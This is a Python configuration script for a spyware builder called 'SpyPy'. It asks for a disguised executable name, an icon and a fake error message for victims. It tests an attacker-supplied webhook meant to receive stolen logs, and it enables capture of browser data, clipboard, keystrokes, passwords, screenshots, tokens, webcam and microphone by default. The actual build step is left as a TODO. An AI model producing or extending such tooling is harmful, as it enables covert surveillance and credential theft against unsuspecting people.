import json
import os
import requests


# Executable things
executable_name = input("What would you like the executable to be named? ").strip()
executable_icon = input("Would you like to add an icon to the executable? (yes/no) ").strip().lower()
if executable_icon == "yes":
    icon_path = input("Enter the path to the icon file: ").strip()
else:
    icon_path = None
fake_error = input("Would you like to display a fake error message? (yes/no) ").strip().lower()
if fake_error == "yes":
    fake_error_message = input("Enter the fake error message: ").strip()
else:
    fake_error_message = None




# Config things
default_config = {
    "webhook": "DEFAULT",
    "logs_path": executable_name,
    "error": {"enabled": True if fake_error == "yes" else False, "message": fake_error_message},
    "browser": {"enabled": True, "interval": 1000, "only_on_first_run": False},
    "clipboard": {"enabled": True, "interval": 1000, "only_on_first_run": False},
    "input": {"enabled": True, "interval": 1000, "only_on_first_run": False},
    "password": {"enabled": True, "interval": 1000, "only_on_first_run": False},
    "screen": {"enabled": True, "interval": 1000, "only_on_first_run": False},
    "token": {"enabled": True, "interval": 1000, "only_on_first_run": False},
    "webcam": {"enabled": True, "interval": 1000, "only_on_first_run": False},
    "microphone": {"enabled": True, "interval": 1000, "only_on_first_run": False},
}



def edit_config():
    global default_config

    print("Current Configuration:")
    print(json.dumps(default_config, indent=4))

    for key in default_config:

        if key == "webhook":
            while True:
                value = input(f"Set '{key}' (URL): ").strip()
                data = {
                    "content": "```SpyPy has been configured to send logs to this webhook.```",
                    "username": "SpyPy",
                }
                try:
                    response = requests.post(value, json=data)
                except:
                    print("Failed to send test message to webhook. Please enter a valid URL.")
                    continue
                if response.status_code == 204 or response.status_code == 200:
                    print("Test message successfully sent to the webhook.")
                    break
                else:
                    print(
                        "Failed to send test message to webhook. Please enter a valid URL."
                    )

            default_config[key] = value
        elif key == "logs_path" or key == "error":
            continue
        else:
            edit_section(default_config[key], key)

    save_config()


def edit_section(section, section_name):
    print(f"\nEditing configuration for '{section_name}':")
    for config_key, config_value in section.items():
        if config_key == "enabled" or config_key == "only_on_first_run":
            value = input(f"Set '{config_key}' (True/False): ").strip().lower()
            section[config_key] = value == "true"
        elif config_key == "interval":
            value = input(f"Set '{config_key}' (integer seconds): ").strip()
            try:
                section[config_key] = int(value)
            except ValueError:
                print("Invalid input. Defaulting to 1000.")
                section[config_key] = 1000
        else:
            print(f"Skipping unknown configuration key '{config_key}'.")


def save_config():
    config_dir = "src"
    if not os.path.exists(config_dir):
        os.makedirs(config_dir)

    config_path = os.path.join(config_dir, "config.json")
    with open(config_path, "w") as f:
        json.dump(default_config, f, indent=4)
    print("Configuration saved to src/config.json.")

edit_config()



# start building the executable
# TODO: Build executable

